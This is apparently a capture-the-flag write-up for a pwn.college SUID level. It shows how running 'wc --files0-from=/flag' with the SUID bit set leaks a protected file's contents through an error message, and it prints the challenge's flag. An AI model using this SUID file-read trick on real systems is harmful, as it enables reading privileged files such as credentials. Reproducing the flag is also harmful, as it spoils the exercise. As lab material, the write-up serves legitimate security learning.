`wc` print newline, word and byte counts for each file.

```bash
hacker@program-misuse-level-47:~$ /challenge/babysuid_level47 
Welcome to /challenge/babysuid_level47!

This challenge is part of a series of programs that
just straight up weren not designed to let you read files.

I just set the SUID bit on /usr/bin/wc.
Try to use it to read the flag!

IMPORTANT: make sure to run me (/challenge/babysuid_level47) every time that you restart
this challenge container to make sure that I set the SUID bit on /usr/bin/wc!
hacker@program-misuse-level-47:~$ wc -c /flag
57 /flag
hacker@program-misuse-level-47:~$ wc -m /flag
57 /flag
hacker@program-misuse-level-47:~$ wc --files0-from=/flag
wc: 'pwn.college{M-INmyxPpCzbFRO-saZHkZSo4IO.0VO4EDL0AjNzQzW}'$'\n': No such file or directory
```

I tried some option like `wc -c /flag` but thing works. Then I searched into the `man wc` and found this:

`--files0-from=F : read input from the files specified by NUL-terminated names in file F; If F is - then read names from standard input`.

It then prints the `flag`.

> [!NOTE]
> Why it prints `No such file or directory?`

